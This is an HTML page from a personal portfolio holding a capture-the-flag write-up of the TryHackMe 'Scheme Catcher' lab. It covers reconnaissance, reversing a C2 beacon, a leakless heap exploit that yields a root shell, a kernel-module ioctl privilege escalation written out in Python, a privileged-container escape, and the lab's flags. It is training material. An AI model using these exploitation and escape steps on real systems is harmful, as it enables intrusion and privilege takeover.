@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Schme Catcher // writeup</title>
+    <meta name="description" content="Schema-flavoured web attacks on Schme Catcher: the enumeration that finds the gap and the exploitation steps that walk through it.">
+    <meta name="theme-color" content="#0a0506">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../style.css">
+    <script>
+        (function () {
+            try {
+                if (localStorage.getItem('theme') === 'light') {
+                    document.documentElement.setAttribute('data-theme', 'light');
+                }
+            } catch (e) { }
+        })();
+    </script>
+</head>
+
+<body class="writeup-page">
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="scroll-progress" id="scrollProgress"></div>
+
+    <header class="writeup-topbar">
+        <a class="prompt-link" href="../writeups.html">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~/writeups</span><span class="prompt-sym">$</span>
+            <span class="prompt-cmd">cd .. [Archive Portal]</span>
+        </a>
+        <div class="topbar-actions">
+            <a class="card-link small github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener"><i class="fab fa-github"></i> GitHub Repo</a>
+            <a class="card-link small" href="../index.html" style="margin-right: 0.5rem;"><i class="fas fa-terminal"></i> Main Dossier</a>
+            <span class="kbd-hint"><kbd>T</kbd> theme</span>
+            <button class="theme-toggle" id="themeToggle" type="button">
+                <i class="fas fa-moon"></i><span>Theme</span>
+            </button>
+        </div>
+    </header>
+
+    <main class="writeup-shell">
+        <article class="writeup-article">
+            <div class="writeup-head">
+                <p class="writeup-kicker">// verified laboratory walkthrough</p>
+                <h1>Schme Catcher</h1>
+                <div class="writeup-meta">
+                    <span class="badge">TryHackMe</span>
+      <span class="badge ghost">Web</span>
+      <span class="badge diff-medium">Medium</span>
+      <span class="meta-item"><i class="fas fa-calendar"></i> 2026-08-25</span>
+      <span class="meta-item"><i class="fas fa-tags"></i> TryHackMe / Web / Medium</span>
+      <span class="meta-item"><i class="fas fa-file-code"></i> schme-catcher.md</span>
+                </div>
+                <p class="writeup-summary">Schema-flavoured web attacks on Schme Catcher: the enumeration that finds the gap and the exploitation steps that walk through it.</p>
+                <div class="writeup-actions">
+                    <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/schme-catcher.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                    <a class="card-link" href="schme-catcher.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                    <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Writeups Portal</a>
+                    <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                </div>
+            </div>
+            <div class="writeup-body">
+                <h1>TryHackMe — AoC 2025 Side Quest Two: &quot;Scheme Catcher&quot; (aoc2025-side2)</h1>
+<h2>The Silent Control System of the Jester</h2>
+<p>Target: 10.48.180.171</p>
+<p>Difficulty: Insane</p>
+<h1>Flags (Summary) — ALL CAPTURED ✅</h1>
+<p>Date: 2026-08-25 # Question Flag Where 1 Flag hidden in strings of beacon.bin THM{Welcom3_to_th3_eastmass_pwnland} the file 2 foothold.txt hidden web dir / THM{byp4ss_and_pack_is_pwn_you_n33d} 7ln6Z1X9EF/ 3 user.txt inside Docker container THM{theres_someth1g_in_th3_w4t3r_that_cannot_l3ak} /home/srv/user.txt 4 root.txt host /root/root.txt THM{final-boss_defeat3d-yay} (privileged container mount)</p>
+<h2>Phase 1 — Reconnaissance</h2>
+<h3>Connectivity check</h3>
+<p>ping -c 2 10.48.180.171        # host up, TTL 62 -&gt; Linux, a couple of hops away</p>
+<h3>Port scan</h3>
+<p>nmap -sV -sC -T4 -p- -oN nmap_full.txt 10.48.180.171 Results: 22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 80/tcp    open  http    Apache httpd 2.4.58 ((Ubuntu))   &quot;Under Construction&quot; 9004/tcp  open  unknown &quot;Payload Storage Malhare&#39;s / Version 4.2.0&quot; Port 9004 is a custom interactive menu service: AoC 2025 Side Quest Two - Scheme Catcher - page 1 / 5</p>
+<p>Payload Storage Malhare&#39;s Version 4.2.0</p>
+<pre class="code-block" data-lang="bash"><code>[1] C:
+[2] U:
+[3] D:
+[4] E:
+&gt;&gt;</code></pre>
+<p>This screams heap note-manager challenge (Create / Update / Delete / Exit).</p>
+<h3>Web enumeration</h3>
+<p>gobuster dir -u http://10.48.180.171 -w /usr/share/wordlists/dirb/common.txt # =&gt; /dev (Status 301) curl -s http://10.48.180.171/dev/ # =&gt; 4.2.0.zip</p>
+<h2>Phase 2 — Reverse Engineering / Enumeration</h2>
+<h3>beacon.bin (from 4.2.0.zip)</h3>
+<p>unzip 4.2.0.zip          # -&gt; latest/beacon.bin file latest/beacon.bin   # ELF 64-bit, not stripped strings latest/beacon.bin Key findings from strings: FLAG #1: THM{Welcom3_to_th3_eastmass_pwnland} 1. Auth key: EastMass 2. It&#39;s a C2 beacon: after key auth it listens on port 4444 with menu 3. 1. Execute command / 2. Load payload / 3. Delete command / 4. Exit Command execution runs /tmp/b68vC103RH via system() 4. &quot;Load payload&quot; sends GET %s HTTP/1.1 / Host: localhost to port 80 5. The binary&#39;s .text is encrypted at rest; runtime decryption was recovered by dumping process memory with gdb while it ran: ./latest/beacon.bin      # enter key: EastMass  -&gt; listens on 4444 gdb -p &lt;pid&gt;             # dump 0x401000-0x402000 after decryption objdump -D -b binary -m i386:x86-64 -M intel --adjust-vma=0x401000 dump.bin Decoded logic:</p>
+<ul><li>main -&gt; strcmp(input, &quot;EastMass&quot;) gate -&gt; start_socket_server() on 4444</li></ul>
+<ul><li>cmd w/ 1 token -&gt; system(&quot;/tmp/b68vC103RH&quot;)</li></ul>
+<ul><li>cmd 2 -&gt; payload_load(): connect(localhost:80) + GET /7ln6Z1X9EF9EF HTTP/1.1</li></ul>
+<p>AoC 2025 Side Quest Two - Scheme Catcher - page 2 / 5</p>
+<h3>Hidden endpoint (FLAG #2)</h3>
+<p>Confirm locally with a listener + tcpdump or just hit the target directly: curl -s http://10.48.180.171/7ln6Z1X9EF/ # =&gt; 4.2.0-R1-1337-server.zip , foothold.txt curl -s http://10.48.180.171/7ln6Z1X9EF/foothold.txt # THM{byp4ss_and_pack_is_pwn_you_n33d}</p>
+<h3>server (from 4.2.0-R1-1337-server.zip)</h3>
+<p>unzip 4.2.0-R1-1337-server.zip   # -&gt; server, libc.so.6, ld-linux-x86-64.so.2 checksec server                  # PIE, Full RELRO, NX, canary; glibc 2.40 strings libc.so.6 | grep &quot;GNU C Library&quot;  # Ubuntu GLIBC 2.40-1ubuntu3 Function map (nm):</p>
+<ul><li>create: chunks[idx] = malloc(size); sizes[idx] = size; idx++ (idx&lt;=255)</li></ul>
+<ul><li>update(idx, offset): checks idx &lt;= 0xf8, chunks[idx] != NULL,</li></ul>
+<p>offset &lt;u sizes[idx], then read(0, chunks[idx]+offset, sizes[idx]-offset)</p>
+<ul><li>delete(idx): free(chunks[idx]) — never clears the pointer!</li></ul>
+<ul><li>no print/show function anywhere =&gt; no memory-disclosure primitive</li></ul>
+<h2>Phase 3 — Vulnerability Analysis</h2>
+<p>UAF write: delete() leaves dangling chunks[i]; update() happily • writes into freed chunks (tcache metadata control). Double free: nothing prevents freeing the same pointer repeatedly. • No leak: there is no output primitive for heap contents, so classic • leak-&gt;tcache-poisoning is impossible. ASLR cannot be defeated by reading. Conclusion: this requires a leakless technique.</p>
+<h2>Phase 4 — Exploitation (leakless House of Water -&gt; House of Apple 2)</h2>
+<p>Technique: https://github.com/corgeman/leakless_research/tree/main/part_1 (&quot;House of Water&quot;) adapted per https://jaxafed.github.io/posts/tryhackme- aoc2025_sidequest_two/ Chain outline: 1. Groom the heap so three same-size chunks (start/middle/end) sit around a large playground chunk whose header fields we can edit via UAF. 2. Forge fake size fields (0x31/0x91/0x21/...) so that when the trio is freed, glibc&#39;s unsorted-bin scanning walks into fake chunks carved out of our own data (&quot;water&quot;), producing a chunk overlap without ever needing an address. 3. The overlap gives a chunk (win, size 0x888) that overlaps the tcache entry which will later serve malloc(0x28). Partially overwrite its safe-linking next LSBs to point the tcache at <em>IO</em>2_1_stdout_&#39;s page. AoC 2025 Side Quest Two - Scheme Catcher - page 3 / 5</p>
+<p>Two ASLR nibbles are unknowable =&gt; brute-force them (heap_brute x libc_brute, 16 x 16 = 256 worst case). 4. Allocate over <em>IO</em>2_1_stdout_, set _flags = 0xfbad3887 (+ zeroed read/write pointers) so the very next puts()dumps the FILE struct back to us, leaking a libc pointer (flags trick) =&gt; full libc base.</p>
+<h2>5. With the leak, write a House of Apple 2 FSOP payload onto a fake</h2>
+<p><em>IO</em>2_1_stdout_ (<em>IO</em>wfile_jumps vtable -&gt; <em>IO</em>wdefault_xsputn chain -&gt; system(&quot;sh&quot;)) and poison tcache again so create(0x3e0-8) lands exactly on the real stdout structure. 6. Next menu puts() triggers the FSOP =&gt; system(&quot;sh&quot;) with stdin/stdout = our socket =&gt; shell as root inside a Docker container. Files used (same dir): server, libc.so.6, io_file.py (Roderick Chan&#39;s FILE-struct helper), solve_fast.py (pipelined + brute-force version). python3 solve_fast.py   # sweeps heap_brute x libc_brute until shell pops On this run the winning pair was heap_brute=0x6, libc_brute=0xc. Each connection re-randomizes, so the script cycles all 256 pairs; wrong nibbles simply crash that connection and it moves on.</p>
+<h3>Proof of shell (captured output)</h3>
+<p>uid=0(root) gid=0(root) groups=0(root) bb21200fff81                       &lt;- Docker container ===USER=== THM{theres_someth1g_in_th3_w4t3r_that_cannot_l3ak}     &lt;- FLAG #3 (/home/srv/user.txt) ... ===ROOT=== THM{final-boss_defeat3d-yay}                            &lt;- FLAG #4 (host /root/root.txt) Post-exploitation inside the container (uid=0): id &amp;&amp; hostname            # root @ bb21200fff81 cat /home/srv/user.txt    # FLAG #3 ls /home/srv              # id_rsa + id_rsa.pub  (agent@tryhackme keypair) cat /proc/1/status | grep CapEff   # 000001ffffffffff =&gt; PRIVILEGED container!</p>
+<h2>Phase 5 — Host access &amp; Privilege Escalation</h2>
+<p>Two routes to FLAG #4: AoC 2025 Side Quest Two - Scheme Catcher - page 4 / 5</p>
+<h3>Route A — kernel module (intended)</h3>
+<p>chmod 600 id_rsa &amp;&amp; ssh -i id_rsa agent@10.48.180.171 sudo -l # (root) NOPASSWD: /usr/sbin/modprobe kagent, modprobe -r kagent #                  /bin/chmod 444 /dev/kagent lsmod | grep kagent scp agent@host:/usr/lib/modules/*/kernel/drivers/kagent.ko . Reverse the module: ioctl handlers c2_heartbeat (snprintf leaks whole ctx if agent_id has no NULs -&gt; leaks session_key + current_op=op_ping), c2_update_conf (144-byte config overwrite gated on session_key), and op_execute (sets caller uid=0). IOCTL_UPDATE_CONF = 0x40933702 IOCTL_HEARTBEAT   = 0xc0b33701 IOCTL_EXEC_OP     = 0x133703 fd = os.open(&quot;/dev/kagent&quot;, os.O_RDONLY) buf = bytearray(b&quot;A&quot;*16 + b&quot;\x00&quot;*144) ioctl(fd, IOCTL_HEARTBEAT, buf) key, op_ping = buf[69:85], struct.unpack(&quot;&lt;Q&quot;, buf[85:93])[0] op_execute   = op_ping + 0x320          # nm -n kagent.ko offset delta cfg = key + b&quot;A&quot;*16 + b&quot;B&quot;*16 + struct.pack(&quot;&lt;Q&quot;, op_execute) ioctl(fd, IOCTL_UPDATE_CONF, bytearray(cfg)) ioctl(fd, IOCTL_EXEC_OP) pty.spawn(&quot;/bin/sh&quot;)                    # uid=0 cat /root/root.txt                      # FLAG #4</p>
+<h3>Route B — privileged container escape (shortcut) — used here</h3>
+<p>Inside the root@container shell: mount /dev/nvme0n1p1 /mnt/hostx cat /mnt/hostx/root/root.txt     # FLAG #4: THM{final-boss_defeat3d-yay}</p>
+<h2>Artifacts</h2>
+<p>nmap_full.txt, disasm.txt, dump_text.asm (decrypted beacon) • solve.py / solve_fast.py, diag.py, io_file.py • pwn_output.txt / proof_shell_container.txt (post-exploitation captures) • AoC 2025 Side Quest Two - Scheme Catcher - page 5 / 5</p>
+            </div>
+            <div class="writeup-foot">
+                <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Full Writeups Portal</a>
+                <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/schme-catcher.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                <a class="card-link" href="schme-catcher.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                <a class="card-link" href="mailto:parajulisameek@gmail.com"><i class="fas fa-envelope"></i> report a typo</a>
+            </div>
+        </article>
+    </main>
+
+    <footer class="site-footer">
+        <p class="footer-cmd">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~</span><span class="prompt-sym">$</span>
+            echo "Defense is good. Offense is mandatory."
+        </p>
+        <p class="footer-muted">&copy; <span id="year"></span> Sameek Parajuli &middot; <a href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener">GitHub /tryhackme_walkthroughs</a></p>
+    </footer>
+
+    <!-- Image Lightbox Modal -->
+    <div class="lightbox-modal" id="lightboxModal" hidden>
+        <div class="lightbox-backdrop"></div>
+        <div class="lightbox-content">
+            <img src="" id="lightboxImg" alt="Enlarged view">
+            <button class="lightbox-close" id="lightboxClose" type="button">&times;</button>
+        </div>
+    </div>
+
+    <div class="scroll-to-top" id="scrollToTop" role="button" tabindex="0" aria-label="Scroll to top">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
+    <script src="../script.js"></script>
+</body>
+
+</html>
